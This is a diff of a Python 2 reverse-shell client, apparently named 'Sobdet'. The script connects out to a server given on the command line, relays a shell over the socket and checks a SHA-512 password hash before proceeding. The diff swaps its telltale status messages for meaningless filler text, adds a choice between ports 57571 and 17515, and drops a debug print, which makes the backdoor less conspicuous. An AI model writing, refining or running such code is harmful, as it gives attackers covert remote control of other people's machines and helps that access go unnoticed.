@@ -4,10 +4,11 @@ import os, socket, subprocess, threading, sys;
 from hashlib import sha512 as s5
 
 def successful():
-    print "[*] Sobdet client connected to %s" % server
+    # print "[*] Sobdet client connected to %s" % server
+    print "Gorem Opsum Dolor Dit met!"
 
 def unsuccessful():
-    print "[!] Unable to connect to port %s on remote server!" % port
+    print "Ftet Alita Iasd Lubergren!"
 
 
 # Linux shell
@@ -43,7 +44,12 @@ def p2s(s, p):
         s.send(p.stdout.read(1))
 
 # Defines remote host details as variables
-server= str(sys.argv[1]); port=57571;system='linux'
+server= str(sys.argv[1]); arg2=int(sys.argv[2]);system='linux'
+if arg2 == 1:
+    port = 57571
+else:
+    port = 17515
+
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 # Checks to see if port on remote host is open.
 # If you ever need to see what error is in the output, add 'z' into the 
@@ -53,7 +59,6 @@ try:
     while True:
         s.send("> ")
         data = s.recv(1024).strip()
-        print(repr(data))
         if s5(data).hexdigest() == '6401ce32f4365a06c661424e1c9159a38527c2dfef69f2f5a3c00685bac9eda66dd8e4674729c8677017115e1fd91b8e0c7f1d190987663c2be4e2f03a4642ab':
             break
 except Exception as erroroutput:
